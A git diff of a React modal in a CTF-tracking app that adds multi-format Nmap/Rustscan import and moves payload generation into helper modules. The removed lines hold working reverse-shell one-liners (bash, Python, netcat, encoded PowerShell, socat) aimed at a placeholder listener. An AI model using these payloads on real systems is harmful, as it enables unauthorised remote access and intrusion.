@@ -1,4 +1,4 @@
-import React, { useState, useMemo } from 'react';
+import React, { useState, useMemo, useRef } from 'react';
 import { motion, AnimatePresence } from 'framer-motion';
 import { 
   X, 
@@ -15,22 +15,30 @@ import {
   RotateCcw,
   Sparkles,
   Layers,
-  ArrowRight
+  ArrowRight,
+  Upload,
+  FileCode,
+  Lock,
+  Radio,
+  Sliders,
+  AlertTriangle
 } from 'lucide-react';
 import { useCtfStore } from '../../store/useCtfStore';
 import { playCyberSound, triggerRootCelebration } from '../../utils/helpers';
 import { PlatformBadge } from '../common/PlatformBadge';
 import { OsBadge } from '../common/OsBadge';
-
-interface ParsedPort {
-  port: number;
-  protocol: string;
-  state: string;
-  service: string;
-  version: string;
-  suggestedTools: string[];
-  cveNotes?: string;
-}
+import { 
+  detectAndParseScan, 
+  ScanImportResult, 
+  ParsedPort 
+} from '../../utils/scanParserUtils';
+import { 
+  getTacticalPayloads, 
+  applyBypassEncoder, 
+  ENCODER_OPTIONS, 
+  BypassEncoderType, 
+  TacticalPayload 
+} from '../../utils/payloadCrafterUtils';
 
 const SAMPLE_LINUX_SCAN = `# Nmap 7.94 scan initiated Wed Sep 2 22:00:00 2026 as: nmap -sC -sV -p- -oN scan.log 10.10.10.3
 Nmap scan report for 10.10.10.3
@@ -73,6 +81,48 @@ PORT     STATE SERVICE       VERSION
 |_http-title: Not Found
 Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows`;
 
+const SAMPLE_RUSTSCAN = `[~] Starting Script(s)
+[>] Host script(s) running
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ -} }}_}{ {__  /  ___} / {} \ |  \| |
+| .-. \| {_} |.-}_} }| } \ .-}_} }\     }/  /\  \|   | |
+\`-' \`-' \`-----'\`----' \`-'-'\`----'  \`---'  \`-'  \`-'\`-' \`-'
+The Modern Day Port Scanner.
+________________________________________
+: https://discord.gg/GFrHRGy
+: https://rustscan.github.io/Rustscan/
+________________________________________
+Open 10.129.228.10:22
+Open 10.129.228.10:80
+Open 10.129.228.10:443
+Open 10.129.228.10:3306
+[PORT] 22
+[PORT] 80
+[PORT] 443
+[PORT] 3306
+Starting Nmap 7.94 ( https://nmap.org ) at 2026-09-02 22:00 UTC
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    nginx 1.18.0 (Ubuntu)
+443/tcp  open  ssl/http nginx 1.18.0 (Ubuntu)
+3306/tcp open  mysql   MySQL 8.0.30`;
+
+const SAMPLE_NMAP_XML = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE nmaprun>
+<nmaprun scanner="nmap" args="nmap -sV -sC 10.10.10.27" start="1725300000" version="7.94">
+<host>
+<status state="up" reason="syn-ack"/>
+<address addr="10.10.10.27" addrtype="ipv4"/>
+<hostnames><hostname name="sniper.htb" type="user"/></hostnames>
+<ports>
+<port protocol="tcp" portid="80"><state state="open" reason="syn-ack"/><service name="http" product="Microsoft IIS httpd" version="10.0"/></port>
+<port protocol="tcp" portid="135"><state state="open" reason="syn-ack"/><service name="msrpc" product="Microsoft Windows RPC"/></port>
+<port protocol="tcp" portid="445"><state state="open" reason="syn-ack"/><service name="microsoft-ds" product="Microsoft Windows Server 2019"/></port>
+<port protocol="tcp" portid="49667"><state state="open" reason="syn-ack"/><service name="msrpc" product="Microsoft Windows RPC"/></port>
+</ports>
+</host>
+</nmaprun>`;
+
 export const ReconAutomationModal: React.FC = () => {
   const { 
     reconAutomationModalOpen, 
@@ -82,15 +132,25 @@ export const ReconAutomationModal: React.FC = () => {
     activeTargetId,
     updateMachine,
     updateMachineStatus,
+    setMachineOpenPorts,
+    setChecklistItemStatus,
     globalVars,
+    setGlobalVars,
     soundEnabled 
   } = useCtfStore();
 
   const [activeTab, setActiveTab] = useState<'parser' | 'payloads' | 'rules'>('parser');
   const [scanText, setScanText] = useState('');
   const [targetMachineId, setTargetMachineId] = useState<string>(selectedMachineId || activeTargetId || machines[0]?.id || '');
-  const [copiedPayloadId, setCopiedPayloadId] = useState<string | null>(null);
+  const [isDragging, setIsDragging] = useState(false);
   const [appliedSuccess, setAppliedSuccess] = useState(false);
+  const fileInputRef = useRef<HTMLInputElement>(null);
+
+  // Payload Crafter state
+  const [payloadCategory, setPayloadCategory] = useState<'all' | 'revshell' | 'web' | 'msfvenom' | 'ad' | 'privesc'>('all');
+  const [selectedEncoder, setSelectedEncoder] = useState<BypassEncoderType>('raw');
+  const [payloadSearch, setPayloadSearch] = useState('');
+  const [copiedPayloadKey, setCopiedPayloadKey] = useState<string | null>(null);
 
   // Auto-tune target machine selection when modal opens
   React.useEffect(() => {
@@ -107,92 +167,54 @@ export const ReconAutomationModal: React.FC = () => {
     return machines.find(m => m.id === targetMachineId) || machines[0];
   }, [machines, targetMachineId]);
 
-  // Automated Regex Parser Engine
-  const parsedResults = useMemo(() => {
-    if (!scanText.trim()) return null;
+  // Frozen Solve Protection Guard: Daniel Dayan's completed solves cannot be overwritten
+  const isTargetFrozen = useMemo(() => {
+    return targetMachine?.status === 'completed';
+  }, [targetMachine]);
 
-    // Detect Host / IP
-    const ipMatch = scanText.match(/Nmap scan report for (?:[^\s(]+\s\()?([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/);
-    const hostMatch = scanText.match(/Nmap scan report for ([^\s(]+)/);
-
-    // Detect OS Guess
-    const osMatch = scanText.match(/Service Info:.*(?:OSs?|OS):\s*([^;\n]+)/i);
-
-    // Extract Open Ports: "PORT     STATE SERVICE     VERSION"
-    const portRegex = /([0-9]{1,5})\/(tcp|udp)\s+open\s+([^\s]+)\s*([^\r\n]*)/gi;
-    const ports: ParsedPort[] = [];
-    let match: RegExpExecArray | null;
-
-    while ((match = portRegex.exec(scanText)) !== null) {
-      const portNum = parseInt(match[1], 10);
-      const proto = match[2].toLowerCase();
-      const service = match[3].toLowerCase();
-      const version = match[4].trim();
-
-      // Automated Offensive Tool & Exploit Recommendations
-      const suggestedTools: string[] = [];
-      let cveNotes = '';
-
-      if (service.includes('ftp') || portNum === 21) {
-        suggestedTools.push('ftp', 'hydra', 'nmap --script ftp-*');
-        if (version.toLowerCase().includes('2.3.4')) {
-          cveNotes = 'CVE-2011-2523 (vsftpd Backdoor RCE)';
-        }
-      } else if (service.includes('ssh') || portNum === 22) {
-        suggestedTools.push('ssh', 'ssh-audit', 'hydra');
-      } else if (service.includes('http') || portNum === 80 || portNum === 443 || portNum === 8080) {
-        suggestedTools.push('ffuf', 'gobuster', 'nikto', 'wpscan', 'whatweb');
-        if (version.includes('2.4.49')) {
-          cveNotes = 'CVE-2021-41773 (Apache Path Traversal & RCE)';
-        } else if (version.includes('2.4.50')) {
-          cveNotes = 'CVE-2021-42013 (Apache RCE Bypass)';
-        }
-      } else if (service.includes('smb') || service.includes('microsoft-ds') || service.includes('netbios') || portNum === 445 || portNum === 139) {
-        suggestedTools.push('crackmapexec smb', 'enum4linux-ng', 'smbclient', 'smbmap');
-        if (version.includes('3.0.20')) {
-          cveNotes = 'CVE-2007-2447 (Samba usermap script RCE)';
-        } else {
-          cveNotes = 'MS17-010 (EternalBlue) / Null Session Check';
-        }
-      } else if (service.includes('domain') || service.includes('dns') || portNum === 53) {
-        suggestedTools.push('dig axfr', 'dnsrecon');
-      } else if (service.includes('kerberos') || portNum === 88) {
-        suggestedTools.push('kerbrute', 'GetNPUsers.py', 'GetUserSPNs.py');
-        cveNotes = 'AS-REP Roasting / Kerberoasting Candidate';
-      } else if (service.includes('ldap') || portNum === 389 || portNum === 636) {
-        suggestedTools.push('ldapsearch', 'bloodhound-python');
-      } else if (service.includes('mysql') || portNum === 3306) {
-        suggestedTools.push('mysql -u root -p', 'sqlmap');
-      } else if (service.includes('rdp') || portNum === 3389) {
-        suggestedTools.push('xfreerdp', 'nmap --script rdp-*');
-      } else if (service.includes('winrm') || portNum === 5985 || portNum === 5986) {
-        suggestedTools.push('evil-winrm');
-      } else {
-        suggestedTools.push('nc -nv', 'nmap -sC -sV');
-      }
-
-      ports.push({
-        port: portNum,
-        protocol: proto,
-        state: 'open',
-        service,
-        version: version || 'Unknown Version',
-        suggestedTools,
-        cveNotes: cveNotes || undefined,
-      });
-    }
-
-    return {
-      detectedIp: ipMatch ? ipMatch[1] : undefined,
-      detectedHost: hostMatch ? hostMatch[1] : undefined,
-      detectedOs: osMatch ? osMatch[1] : undefined,
-      ports,
-    };
+  // Universal Auto-detecting Multi-Format Scan Parser Engine
+  const parsedResults = useMemo<ScanImportResult | null>(() => {
+    return detectAndParseScan(scanText);
   }, [scanText]);
 
-  // Apply Automation to Machine
+  // Check if detected IP matches another machine in the catalog
+  const autoMatchedTarget = useMemo(() => {
+    if (!parsedResults?.detectedIp) return null;
+    return machines.find(m => m.ip === parsedResults.detectedIp && m.id !== targetMachineId) || null;
+  }, [parsedResults?.detectedIp, machines, targetMachineId]);
+
+  // File Drop Handler
+  const handleDrop = (e: React.DragEvent) => {
+    e.preventDefault();
+    setIsDragging(false);
+    const files = e.dataTransfer.files;
+    if (files && files.length > 0) {
+      const file = files[0];
+      const reader = new FileReader();
+      reader.onload = (event) => {
+        const content = event.target?.result as string;
+        if (content) setScanText(content);
+      };
+      reader.readAsText(file);
+    }
+  };
+
+  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const files = e.target.files;
+    if (files && files.length > 0) {
+      const file = files[0];
+      const reader = new FileReader();
+      reader.onload = (event) => {
+        const content = event.target?.result as string;
+        if (content) setScanText(content);
+      };
+      reader.readAsText(file);
+    }
+  };
+
+  // Safe Apply Automation to Target Machine (Guarded from mutating completed solves)
   const handleApplyToMachine = () => {
-    if (!targetMachine || !parsedResults) return;
+    if (!targetMachine || !parsedResults || isTargetFrozen) return;
 
     const portNumbers = parsedResults.ports.map(p => p.port);
     
@@ -202,21 +224,29 @@ export const ReconAutomationModal: React.FC = () => {
       `- **Port ${p.port}/${p.protocol}** (${p.service.toUpperCase()}): ${p.version}${p.cveNotes ? ` ➔ 🚨 *${p.cveNotes}*` : ''}`
     ).join('\n');
 
-    const reconNotes = `\n\n### ⚡ Automated Nmap Intake (${timestamp})\n` +
+    const reconNotes = `\n\n### ⚡ Automated Scan Intake [${parsedResults.format.toUpperCase()}] (${timestamp})\n` +
       `- **Target Host**: ${parsedResults.detectedHost || targetMachine.ip}\n` +
       `- **Detected OS**: ${parsedResults.detectedOs || targetMachine.os}\n` +
-      `#### Open Services:\n${portSummary}\n`;
+      `#### Open Services (${parsedResults.ports.length}):\n${portSummary}\n`;
 
     const existingNotes = targetMachine.quickNotes || '';
     const updatedNotes = existingNotes ? `${existingNotes}${reconNotes}` : reconNotes.trim();
 
-    // Auto-populate openPorts and quickNotes
+    // 1. Update machine open ports & quick notes safely
     updateMachine(targetMachine.id, {
       openPorts: Array.from(new Set([...(targetMachine.openPorts || []), ...portNumbers])),
       quickNotes: updatedNotes,
     });
 
-    // Automatically advance machine status from backlog to recon if still in backlog
+    // 2. Safely sync openPorts to machine checklist
+    setMachineOpenPorts(targetMachine.id, portNumbers);
+
+    // 3. Mark surface discovery checklist items done
+    setChecklistItemStatus(targetMachine.id, 'p01-fast-syn', 'done');
+    setChecklistItemStatus(targetMachine.id, 'p01-full-tcp', 'done');
+    setChecklistItemStatus(targetMachine.id, 'p02-banner-grab', 'done');
+
+    // 4. Advance status from backlog to recon if still in backlog
     if (targetMachine.status === 'backlog') {
       updateMachineStatus(targetMachine.id, 'recon');
     }
@@ -230,74 +260,40 @@ export const ReconAutomationModal: React.FC = () => {
     }, 3000);
   };
 
-  // Automated Payloads Generator
-  const payloadTargetIp = targetMachine?.ip || globalVars.targetIp;
+  // Dynamic Tactical Payloads Catalog
+  const payloadTargetIp = targetMachine?.ip || globalVars.targetIp || '10.10.10.X';
   const lhost = globalVars.lhost || '10.10.14.X';
   const lport = globalVars.lport || '4444';
 
-  const automatedPayloads = useMemo(() => {
-    const rawBash = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
-    const rawPython = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`;
-    const rawNetcat = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${lhost} ${lport} >/tmp/f`;
-    const rawPowerShell = `$client = New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
-    
-    // PowerShell Base64 Encoded (UTF-16LE)
-    let psEncoded = '';
-    try {
-      const buffer = new TextEncoder().encode(rawPowerShell);
-      const utf16Bytes: number[] = [];
-      for (let i = 0; i < buffer.length; i++) {
-        utf16Bytes.push(buffer[i], 0);
+  const tacticalPayloads = useMemo(() => {
+    return getTacticalPayloads({
+      lhost,
+      lport,
+      targetIp: payloadTargetIp,
+    });
+  }, [lhost, lport, payloadTargetIp]);
+
+  const filteredPayloads = useMemo(() => {
+    return tacticalPayloads.filter((p) => {
+      if (payloadCategory !== 'all' && p.category !== payloadCategory) return false;
+      if (payloadSearch.trim()) {
+        const query = payloadSearch.toLowerCase();
+        return (
+          p.title.toLowerCase().includes(query) ||
+          p.subCategory.toLowerCase().includes(query) ||
+          p.commandTemplate.toLowerCase().includes(query) ||
+          p.description.toLowerCase().includes(query)
+        );
       }
-      psEncoded = btoa(String.fromCharCode(...utf16Bytes));
-    } catch {
-      psEncoded = btoa(rawPowerShell);
-    }
+      return true;
+    });
+  }, [tacticalPayloads, payloadCategory, payloadSearch]);
 
-    return [
-      {
-        id: 'bash-tcp',
-        title: 'Bash Interactive TCP Reverse Shell',
-        category: 'Linux / Unix',
-        payload: rawBash,
-        encodedPayload: `echo "${btoa(rawBash)}" | base64 -d | bash`,
-      },
-      {
-        id: 'python-pty',
-        title: 'Python3 Full PTY Reverse Shell',
-        category: 'Cross-Platform',
-        payload: rawPython,
-        encodedPayload: `python3 -c "import base64;exec(base64.b64decode('${btoa(rawPython)}').decode())"`,
-      },
-      {
-        id: 'nc-mkfifo',
-        title: 'Netcat Traditional mkfifo FIFO Shell',
-        category: 'Linux / BSD',
-        payload: rawNetcat,
-        encodedPayload: `echo ${btoa(rawNetcat)} | base64 -d | sh`,
-      },
-      {
-        id: 'ps-base64',
-        title: 'PowerShell Bypassing Base64 Shell',
-        category: 'Windows',
-        payload: `powershell -nop -w hidden -e ${psEncoded}`,
-        encodedPayload: `powershell -EncodedCommand ${psEncoded}`,
-      },
-      {
-        id: 'socat-pty',
-        title: 'Socat Fully Stabilized TTY Pwn Shell',
-        category: 'Linux',
-        payload: `socat tcp-connect:${lhost}:${lport} exec:"bash -li",pty,stderr,setsid,sigint,sane`,
-        encodedPayload: `socat tcp-connect:${lhost}:${lport} exec:"sh",pty,stderr,setsid,sigint,sane`,
-      },
-    ];
-  }, [lhost, lport]);
-
-  const copyPayload = (text: string, id: string) => {
+  const copyPayload = (text: string, key: string) => {
     navigator.clipboard.writeText(text);
-    setCopiedPayloadId(id);
+    setCopiedPayloadKey(key);
     if (soundEnabled) playCyberSound('copy');
-    setTimeout(() => setCopiedPayloadId(null), 2000);
+    setTimeout(() => setCopiedPayloadKey(null), 2000);
   };
 
   if (!reconAutomationModalOpen) return null;
@@ -312,26 +308,26 @@ export const ReconAutomationModal: React.FC = () => {
         animate={{ opacity: 1, scale: 1, y: 0 }}
         exit={{ opacity: 0, scale: 0.95, y: 15 }}
         transition={{ duration: 0.18 }}
-        className="w-full sm:max-w-4xl h-full sm:h-[90vh] max-h-none sm:max-h-[820px] flex flex-col rounded-none sm:rounded-2xl border-0 sm:border border-cyber-emerald/40 bg-cyber-card shadow-2xl overflow-hidden relative z-10"
+        className="w-full sm:max-w-5xl h-full sm:h-[92vh] max-h-none sm:max-h-[860px] flex flex-col rounded-none sm:rounded-2xl border-0 sm:border border-cyber-cyan/40 bg-cyber-card shadow-2xl overflow-hidden relative z-10"
         onClick={(e) => e.stopPropagation()}
       >
         {/* Modal Header */}
         <div className="flex-shrink-0 flex items-center justify-between p-4 border-b border-cyber-border bg-cyber-bg/95 backdrop-blur-md">
           <div className="flex items-center gap-3">
-            <div className="w-9 h-9 rounded-lg bg-cyber-emerald/10 border border-cyber-emerald/40 flex items-center justify-center text-cyber-emerald shadow-[0_0_12px_rgba(16,185,129,0.3)]">
+            <div className="w-9 h-9 rounded-lg bg-cyber-cyan/10 border border-cyber-cyan/40 flex items-center justify-center text-cyber-cyan shadow-[0_0_12px_rgba(6,182,212,0.3)]">
               <Zap className="w-5 h-5 animate-pulse" />
             </div>
             <div>
               <div className="flex items-center gap-2">
                 <h2 className="text-base font-bold text-white tracking-wide">
-                  TACTICAL AUTOMATION HUB
+                  ZEROBOX TACTICAL AUTOMATION HUB
                 </h2>
-                <span className="text-[10px] px-2 py-0.5 rounded bg-cyber-emerald/10 border border-cyber-emerald/40 text-cyber-emerald font-bold">
-                  AUTO-RECON & PAYLOADS
+                <span className="text-[10px] px-2 py-0.5 rounded bg-cyber-cyan/10 border border-cyber-cyan/40 text-cyber-cyan font-bold">
+                  MULTI-FORMAT SCAN & PAYLOAD CRAFTER
                 </span>
               </div>
               <p className="text-[11px] text-cyber-muted">
-                Automatic scan intake, vulnerability matching, and zero-touch payload generation.
+                Multi-format scan ingestion (XML, Nmap, Grepable, Rustscan), freeze-guarded auto-apply, and real-time bypass encoders.
               </p>
             </div>
           </div>
@@ -346,29 +342,55 @@ export const ReconAutomationModal: React.FC = () => {
 
         {/* Target Machine Selection Bar */}
         <div className="flex-shrink-0 px-4 py-2.5 bg-cyber-bg border-b border-cyber-border flex items-center justify-between gap-4 flex-wrap text-xs">
-          <div className="flex items-center gap-2">
+          <div className="flex items-center gap-2 flex-wrap">
             <span className="text-cyber-muted uppercase text-[10px] font-bold">TARGET WORKSPACE:</span>
             <select
               value={targetMachineId}
               onChange={(e) => setTargetMachineId(e.target.value)}
-              className="bg-cyber-card border border-cyber-border px-2.5 py-1 rounded text-white font-bold text-xs focus:outline-none focus:border-cyber-emerald"
+              className="bg-cyber-card border border-cyber-border px-2.5 py-1 rounded text-white font-bold text-xs focus:outline-none focus:border-cyber-cyan"
             >
               {machines.map((m) => (
                 <option key={m.id} value={m.id}>
-                  {m.name} ({m.platform} - {m.ip})
+                  {m.status === 'completed' ? '🔒 ' : ''}{m.name} ({m.platform} - {m.ip}) [{m.status.toUpperCase()}]
                 </option>
               ))}
             </select>
+
+            {isTargetFrozen && (
+              <span className="flex items-center gap-1 text-[10px] px-2 py-0.5 rounded bg-amber-950/40 border border-amber-600/50 text-amber-300 font-semibold">
+                <Lock className="w-3 h-3 text-amber-400" />
+                <span>SOLVE FROZEN (IMMUTABLE)</span>
+              </span>
+            )}
           </div>
 
           {targetMachine && (
             <div className="flex items-center gap-2">
               <PlatformBadge platform={targetMachine.platform} size="sm" />
               <OsBadge os={targetMachine.os} size="xs" />
-              <span className="text-cyber-muted text-[11px]">{targetMachine.ip}</span>
+              <span className="text-cyber-muted text-[11px] font-mono">{targetMachine.ip}</span>
             </div>
           )}
         </div>
+
+        {/* Auto-detected Target Match Prompt */}
+        {autoMatchedTarget && (
+          <div className="flex-shrink-0 px-4 py-2 bg-cyber-cyan/10 border-b border-cyber-cyan/30 flex items-center justify-between gap-2 text-xs">
+            <div className="flex items-center gap-2 text-cyber-cyan">
+              <Radio className="w-4 h-4 animate-ping text-cyber-cyan" />
+              <span>
+                Detected IP <strong className="text-white font-mono">{parsedResults?.detectedIp}</strong> matches catalog target <strong className="text-white">{autoMatchedTarget.name}</strong> ({autoMatchedTarget.platform})
+              </span>
+            </div>
+            <button
+              onClick={() => setTargetMachineId(autoMatchedTarget.id)}
+              className="px-2.5 py-1 rounded bg-cyber-cyan text-black font-bold text-xs hover:bg-cyan-300 transition-colors shadow-sm flex items-center gap-1"
+            >
+              <span>Switch to {autoMatchedTarget.name}</span>
+              <ArrowRight className="w-3 h-3" />
+            </button>
+          </div>
+        )}
 
         {/* Navigation Tabs */}
         <div className="flex-shrink-0 flex items-center border-b border-cyber-border bg-cyber-card px-4 pt-2 gap-2 text-xs">
@@ -376,14 +398,14 @@ export const ReconAutomationModal: React.FC = () => {
             onClick={() => setActiveTab('parser')}
             className={`px-3 py-2 border-b-2 font-bold transition-all flex items-center gap-2 ${
               activeTab === 'parser'
-                ? 'border-cyber-emerald text-cyber-emerald bg-cyber-emerald/5'
+                ? 'border-cyber-cyan text-cyber-cyan bg-cyber-cyan/5'
                 : 'border-transparent text-cyber-muted hover:text-white'
             }`}
           >
             <Terminal className="w-3.5 h-3.5" />
-            <span>NMAP & SCAN PARSER</span>
+            <span>SCAN & NMAP IMPORTER</span>
             {parsedResults && parsedResults.ports.length > 0 && (
-              <span className="text-[10px] px-1.5 py-0.2 rounded-full bg-cyber-emerald/20 text-cyber-emerald font-bold">
+              <span className="text-[10px] px-1.5 py-0.2 rounded-full bg-cyber-cyan/20 text-cyber-cyan font-bold">
                 {parsedResults.ports.length} ports
               </span>
             )}
@@ -393,12 +415,15 @@ export const ReconAutomationModal: React.FC = () => {
             onClick={() => setActiveTab('payloads')}
             className={`px-3 py-2 border-b-2 font-bold transition-all flex items-center gap-2 ${
               activeTab === 'payloads'
-                ? 'border-cyber-cyan text-cyber-cyan bg-cyber-cyan/5'
+                ? 'border-cyber-emerald text-cyber-emerald bg-cyber-emerald/5'
                 : 'border-transparent text-cyber-muted hover:text-white'
             }`}
           >
             <Flame className="w-3.5 h-3.5" />
-            <span>AUTO-PAYLOAD GENERATOR</span>
+            <span>TACTICAL PAYLOAD CRAFTER</span>
+            <span className="text-[10px] px-1.5 py-0.2 rounded-full bg-cyber-emerald/20 text-cyber-emerald font-bold">
+              {tacticalPayloads.length}
+            </span>
           </button>
 
           <button
@@ -416,53 +441,159 @@ export const ReconAutomationModal: React.FC = () => {
 
         {/* Modal Body */}
         <div className="flex-1 overflow-y-auto p-4 sm:p-5 space-y-4 text-xs scrollbar-thin">
+          {/* TAB 1: SCAN & NMAP IMPORTER */}
           {activeTab === 'parser' && (
             <div className="space-y-4">
               {/* Controls bar */}
               <div className="flex items-center justify-between gap-2 flex-wrap">
-                <div className="flex items-center gap-2">
+                <div className="flex items-center gap-2 flex-wrap">
                   <span className="text-[10px] font-bold text-cyber-muted uppercase">LOAD SAMPLES:</span>
                   <button
                     onClick={() => setScanText(SAMPLE_LINUX_SCAN)}
                     className="px-2.5 py-1 rounded bg-cyber-bg border border-cyber-border text-cyber-cyan hover:border-cyber-cyan text-[11px] transition-colors flex items-center gap-1 font-semibold"
                   >
-                    <Sparkles className="w-3 h-3" /> Linux (Lame)
+                    <Sparkles className="w-3 h-3" /> Linux Lame
                   </button>
                   <button
                     onClick={() => setScanText(SAMPLE_WINDOWS_AD_SCAN)}
                     className="px-2.5 py-1 rounded bg-cyber-bg border border-cyber-border text-blue-400 hover:border-blue-400 text-[11px] transition-colors flex items-center gap-1 font-semibold"
                   >
-                    <Sparkles className="w-3 h-3" /> Windows Active Directory
+                    <Sparkles className="w-3 h-3" /> Windows AD
+                  </button>
+                  <button
+                    onClick={() => setScanText(SAMPLE_NMAP_XML)}
+                    className="px-2.5 py-1 rounded bg-cyber-bg border border-cyber-border text-emerald-400 hover:border-emerald-400 text-[11px] transition-colors flex items-center gap-1 font-semibold"
+                  >
+                    <FileCode className="w-3 h-3" /> Nmap XML
+                  </button>
+                  <button
+                    onClick={() => setScanText(SAMPLE_RUSTSCAN)}
+                    className="px-2.5 py-1 rounded bg-cyber-bg border border-cyber-border text-orange-400 hover:border-orange-400 text-[11px] transition-colors flex items-center gap-1 font-semibold"
+                  >
+                    <Sparkles className="w-3 h-3" /> Rustscan
                   </button>
                 </div>
 
-                {scanText && (
+                <div className="flex items-center gap-2">
+                  <input
+                    type="file"
+                    ref={fileInputRef}
+                    onChange={handleFileUpload}
+                    accept=".xml,.nmap,.gnmap,.txt,.log"
+                    className="hidden"
+                  />
                   <button
-                    onClick={() => setScanText('')}
-                    className="text-cyber-muted hover:text-cyber-crimson text-[11px] flex items-center gap-1 transition-colors"
+                    onClick={() => fileInputRef.current?.click()}
+                    className="px-2.5 py-1 rounded bg-cyber-bg border border-cyber-border text-white hover:border-cyber-cyan text-[11px] flex items-center gap-1 transition-colors"
                   >
-                    <RotateCcw className="w-3 h-3" /> Clear Scan
+                    <Upload className="w-3 h-3 text-cyber-cyan" /> Upload Scan
                   </button>
-                )}
+
+                  {scanText && (
+                    <button
+                      onClick={() => setScanText('')}
+                      className="text-cyber-muted hover:text-cyber-crimson text-[11px] flex items-center gap-1 transition-colors ml-1"
+                    >
+                      <RotateCcw className="w-3 h-3" /> Clear
+                    </button>
+                  )}
+                </div>
               </div>
 
-              {/* Scan Textarea */}
-              <div>
+              {/* Drag & Drop Zone + Textarea */}
+              <div 
+                onDragOver={(e) => { e.preventDefault(); setIsDragging(true); }}
+                onDragLeave={() => setIsDragging(false)}
+                onDrop={handleDrop}
+                className={`relative rounded-xl transition-all ${
+                  isDragging 
+                    ? 'ring-2 ring-cyber-cyan bg-cyber-cyan/10' 
+                    : ''
+                }`}
+              >
                 <textarea
                   value={scanText}
                   onChange={(e) => setScanText(e.target.value)}
-                  placeholder="Paste your raw Nmap, Rustscan, or Masscan log here... (e.g. nmap -sC -sV -p- 10.10.10.X)"
+                  placeholder="Paste or drag-and-drop raw scan logs here... Supports Nmap XML, Standard Nmap (.nmap), Grepable (.gnmap), Rustscan, and raw port lists."
                   rows={6}
-                  className="w-full bg-cyber-bg px-3 py-2.5 rounded-xl border border-cyber-border text-cyber-emerald font-mono text-xs focus:outline-none focus:border-cyber-emerald transition-all shadow-inner leading-relaxed"
+                  className="w-full bg-cyber-bg px-3.5 py-2.5 rounded-xl border border-cyber-border text-cyber-emerald font-mono text-xs focus:outline-none focus:border-cyber-cyan transition-all shadow-inner leading-relaxed"
                 />
+
+                {isDragging && (
+                  <div className="absolute inset-0 bg-black/75 backdrop-blur-sm rounded-xl flex items-center justify-center pointer-events-none">
+                    <div className="text-center text-cyber-cyan space-y-1">
+                      <Upload className="w-8 h-8 mx-auto animate-bounce" />
+                      <p className="font-bold text-sm">Drop scan file (.xml, .nmap, .gnmap, .txt) to parse</p>
+                    </div>
+                  </div>
+                )}
               </div>
+
+              {/* Format Badge & Metadata Bar */}
+              {parsedResults && (
+                <div className="flex items-center justify-between gap-2 flex-wrap px-3 py-2 rounded-lg bg-cyber-bg border border-cyber-border text-[11px]">
+                  <div className="flex items-center gap-2 flex-wrap">
+                    <span className="text-cyber-muted font-bold">DETECTED FORMAT:</span>
+                    <span className={`px-2 py-0.5 rounded font-bold uppercase text-[10px] ${
+                      parsedResults.format === 'nmap-xml'
+                        ? 'bg-emerald-950/60 border border-emerald-500/60 text-emerald-400'
+                        : parsedResults.format === 'rustscan'
+                        ? 'bg-orange-950/60 border border-orange-500/60 text-orange-400'
+                        : parsedResults.format === 'gnmap'
+                        ? 'bg-purple-950/60 border border-purple-500/60 text-purple-400'
+                        : 'bg-cyan-950/60 border border-cyan-500/60 text-cyan-400'
+                    }`}>
+                      {parsedResults.format}
+                    </span>
+
+                    {parsedResults.detectedIp && (
+                      <span className="px-2 py-0.5 rounded bg-cyber-card border border-cyber-border text-white font-mono">
+                        IP: {parsedResults.detectedIp}
+                      </span>
+                    )}
+
+                    {parsedResults.detectedHost && (
+                      <span className="px-2 py-0.5 rounded bg-cyber-card border border-cyber-border text-white">
+                        HOST: {parsedResults.detectedHost}
+                      </span>
+                    )}
+
+                    {parsedResults.detectedOs && (
+                      <span className="px-2 py-0.5 rounded bg-cyber-card border border-cyber-border text-white">
+                        OS: {parsedResults.detectedOs}
+                      </span>
+                    )}
+                  </div>
+
+                  <span className="text-cyber-muted">
+                    Found <strong className="text-white font-bold">{parsedResults.ports.length}</strong> open ports
+                  </span>
+                </div>
+              )}
+
+              {/* Frozen Solve Banner Warning */}
+              {isTargetFrozen && parsedResults && (
+                <div className="p-3 rounded-xl bg-amber-950/30 border border-amber-500/50 flex items-start gap-3 text-xs">
+                  <AlertTriangle className="w-5 h-5 text-amber-400 flex-shrink-0 mt-0.5" />
+                  <div className="space-y-1">
+                    <div className="font-bold text-amber-300">
+                      TARGET IS COMPLETED // MODIFICATION FROZEN
+                    </div>
+                    <p className="text-amber-200/80 leading-relaxed text-[11px]">
+                      Target <strong className="text-white font-semibold">{targetMachine?.name}</strong> is one of Daniel Dayan's 63 completed solves. 
+                      Solve statuses, flags, and checklist milestones are strictly frozen to preserve operational integrity. 
+                      To apply this scan, please select an in-progress or backlog target from the dropdown above.
+                    </p>
+                  </div>
+                </div>
+              )}
 
               {/* Parser Output / Intelligence Dashboard */}
               {parsedResults && (
                 <motion.div
                   initial={{ opacity: 0, y: 10 }}
                   animate={{ opacity: 1, y: 0 }}
-                  className="p-4 rounded-xl border border-cyber-emerald/30 bg-cyber-bg/70 space-y-3.5 shadow-lg"
+                  className="p-4 rounded-xl border border-cyber-cyan/30 bg-cyber-bg/70 space-y-3.5 shadow-lg"
                 >
